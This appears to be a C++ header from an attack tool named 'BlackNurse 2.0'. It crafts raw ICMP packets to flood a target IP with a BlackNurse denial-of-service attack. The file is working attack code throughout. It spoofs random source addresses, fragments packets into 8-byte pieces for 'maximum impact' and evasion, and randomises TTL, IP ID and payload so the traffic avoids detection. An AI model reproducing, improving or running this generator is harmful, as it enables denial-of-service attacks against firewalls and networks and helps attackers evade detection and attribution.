/**
 * BlackNurse 2.0 - Packet Generator
 * 
 * High-performance packet generation with multiple attack vectors,
 * stealth capabilities, and optimized packet crafting.
 */

#pragma once

#include <vector>
#include <random>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
// Linux-only optimized version
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <unistd.h>

#include "common/config.hpp"
#include "common/logger.hpp"

#include <netinet/in.h>
#include <netinet/ip_icmp.h>

namespace blacknurse {

/**
 * Packet structure for efficient handling
 */
struct Packet {
    std::vector<uint8_t> data;
    size_t size() const { return data.size(); }
    uint8_t* raw() { return data.data(); }
    const uint8_t* raw() const { return data.data(); }
};

/**
     * Enhanced packet generator with multiple attack vectors
 */
class PacketGenerator {
public:
    explicit PacketGenerator(const Config& config) 
        : config_(config), packet_id_(1) {
        
        // Resolve target IP
        if (inet_aton(config_.target_ip.c_str(), &target_addr_) == 0) {
            throw std::invalid_argument("Invalid target IP address: " + config_.target_ip);
        }
        
        // Setup source IP
        if (!config_.source_ip.empty()) {
            if (inet_aton(config_.source_ip.c_str(), &source_addr_) == 0) {
                throw std::invalid_argument("Invalid source IP address: " + config_.source_ip);
            }
            use_random_source_ = false;
        } else {
            use_random_source_ = true;
        }
        
        Logger::info("Packet generator initialized for target: " + config_.target_ip);
    }
    
    /**
     * Generate ICMP packet for BlackNurse attack
     */
    Packet generate_icmp_packet(std::mt19937& rng) {
        Packet packet;
        
        // Calculate total packet size
        size_t ip_header_size = sizeof(struct iphdr);
        size_t icmp_header_size = sizeof(struct icmphdr);
        size_t total_size = ip_header_size + icmp_header_size + config_.payload_size;
        
        packet.data.resize(total_size);
        
        // Fill IP header
        auto* ip_header = reinterpret_cast<struct iphdr*>(packet.raw());
        fill_ip_header(ip_header, total_size, rng);
        
        // Fill ICMP header
        auto* icmp_header = reinterpret_cast<struct icmphdr*>(packet.raw() + ip_header_size);
        fill_icmp_header(icmp_header, rng);
        
        // Fill payload
        if (config_.payload_size > 0) {
            fill_payload(packet.raw() + ip_header_size + icmp_header_size, config_.payload_size, rng);
        }
        
        // Calculate checksums
        calculate_icmp_checksum(icmp_header, icmp_header_size + config_.payload_size);
        calculate_ip_checksum(ip_header);
        
        return packet;
    }
    
    /**
     * Generate fragmented ICMP packet for enhanced evasion
     */
    std::vector<Packet> generate_fragmented_packet(std::mt19937& rng) {
        std::vector<Packet> fragments;
        
        // Generate base packet
        auto base_packet = generate_icmp_packet(rng);
        
        // Fragment the packet
        size_t fragment_size = 8; // 8-byte fragments for maximum impact
        size_t ip_header_size = sizeof(struct iphdr);
        size_t payload_start = ip_header_size;
        size_t payload_size = base_packet.size() - ip_header_size;
        
        for (size_t offset = 0; offset < payload_size; offset += fragment_size) {
            Packet fragment;
            size_t current_fragment_size = std::min(fragment_size, payload_size - offset);
            fragment.data.resize(ip_header_size + current_fragment_size);
            
            // Copy and modify IP header
            auto* ip_header = reinterpret_cast<struct iphdr*>(fragment.raw());
            std::memcpy(ip_header, base_packet.raw(), ip_header_size);
            
            // Set fragment flags and offset
            uint16_t flags_and_offset = (offset / 8);
            if (offset + fragment_size < payload_size) {
                flags_and_offset |= 0x2000; // More fragments flag
            }
            ip_header->frag_off = htons(flags_and_offset);
            ip_header->tot_len = htons(ip_header_size + current_fragment_size);
            
            // Copy fragment data
            std::memcpy(fragment.raw() + ip_header_size, 
                       base_packet.raw() + payload_start + offset, 
                       current_fragment_size);
            
            // Recalculate IP checksum
            calculate_ip_checksum(ip_header);
            
            fragments.push_back(std::move(fragment));
        }
        
        return fragments;
    }
    
    /**
     * Generate stealth packet with evasion techniques
     */
    Packet generate_stealth_packet(std::mt19937& rng) {
        auto packet = generate_icmp_packet(rng);
        
        auto* ip_header = reinterpret_cast<struct iphdr*>(packet.raw());
        
        // Apply stealth techniques
        if (config_.stealth_mode) {
            // Random TTL values to avoid detection
            std::uniform_int_distribution<uint8_t> ttl_dist(32, 128);
            ip_header->ttl = ttl_dist(rng);
            
            // Random IP ID
            std::uniform_int_distribution<uint16_t> id_dist(1, 65535);
            ip_header->id = htons(id_dist(rng));
            
            // Recalculate checksum
            calculate_ip_checksum(ip_header);
        }
        
        return packet;
    }
    
private:
    void fill_ip_header(struct iphdr* ip_header, size_t total_size, std::mt19937& rng) {
        std::memset(ip_header, 0, sizeof(struct iphdr));
        
        ip_header->version = 4;
        ip_header->ihl = 5;
        ip_header->tos = 0;
        ip_header->tot_len = htons(total_size);
        ip_header->id = htons(packet_id_++);
        ip_header->frag_off = 0;
        ip_header->ttl = config_.ttl;
        ip_header->protocol = IPPROTO_ICMP;
        ip_header->check = 0; // Will be calculated later
        
        // Set source IP
        if (use_random_source_) {
            ip_header->saddr = generate_random_ip(rng);
        } else {
            ip_header->saddr = source_addr_.s_addr;
        }
        
        // Set destination IP
        ip_header->daddr = target_addr_.s_addr;
    }
    
    void fill_icmp_header(struct icmphdr* icmp_header, std::mt19937& rng) {
        std::memset(icmp_header, 0, sizeof(struct icmphdr));
        
        icmp_header->type = config_.icmp_type;
        icmp_header->code = config_.icmp_code;
        icmp_header->checksum = 0; // Will be calculated later
        
        // Add some randomization for stealth
        if (config_.stealth_mode) {
            std::uniform_int_distribution<uint16_t> id_dist(1, 65535);
            icmp_header->un.echo.id = htons(id_dist(rng));
            icmp_header->un.echo.sequence = htons(id_dist(rng));
        } else {
            icmp_header->un.echo.id = htons(getpid());
            icmp_header->un.echo.sequence = htons(packet_id_);
        }
    }
    
    void fill_payload(uint8_t* payload, size_t size, std::mt19937& rng) {
        if (config_.stealth_mode) {
            // Random payload for stealth
            std::uniform_int_distribution<uint8_t> byte_dist(0, 255);
            for (size_t i = 0; i < size; ++i) {
                payload[i] = byte_dist(rng);
            }
        } else {
            // Pattern payload for maximum impact
            const uint8_t pattern[] = {0x08, 0xEF, 0xC1, 0x00};
            for (size_t i = 0; i < size; ++i) {
                payload[i] = pattern[i % sizeof(pattern)];
            }
        }
    }
    
    uint32_t generate_random_ip(std::mt19937& rng) {
        std::uniform_int_distribution<uint32_t> ip_dist(0x01000000, 0xFEFFFFFF);
        uint32_t ip = ip_dist(rng);
        
        // Avoid reserved ranges
        uint8_t first_octet = (ip >> 24) & 0xFF;
        if (first_octet == 10 || first_octet == 127 || 
            (first_octet == 172 && ((ip >> 16) & 0xF0) == 0x10) ||
            (first_octet == 192 && ((ip >> 16) & 0xFF) == 0xA8)) {
            return generate_random_ip(rng); // Recursively try again
        }
        
        return htonl(ip);
    }
    
    void calculate_ip_checksum(struct iphdr* ip_header) {
        ip_header->check = 0;
        
        uint32_t sum = 0;
        uint16_t* ptr = reinterpret_cast<uint16_t*>(ip_header);
        
        for (int i = 0; i < 10; ++i) {
            sum += ntohs(ptr[i]);
        }
        
        while (sum >> 16) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        
        ip_header->check = htons(~sum);
    }
    
    void calculate_icmp_checksum(struct icmphdr* icmp_header, size_t size) {
        icmp_header->checksum = 0;
        
        uint32_t sum = 0;
        uint16_t* ptr = reinterpret_cast<uint16_t*>(icmp_header);
        
        // Sum all 16-bit words
        for (size_t i = 0; i < size / 2; ++i) {
            sum += ntohs(ptr[i]);
        }
        
        // Add odd byte if present
        if (size % 2) {
            sum += (reinterpret_cast<uint8_t*>(icmp_header)[size - 1]) << 8;
        }
        
        // Fold 32-bit sum to 16 bits
        while (sum >> 16) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        
        icmp_header->checksum = htons(~sum);
    }
    
    const Config& config_;
    struct in_addr target_addr_;
    struct in_addr source_addr_;
    bool use_random_source_;
    std::atomic<uint16_t> packet_id_;
};

} // namespace blacknurse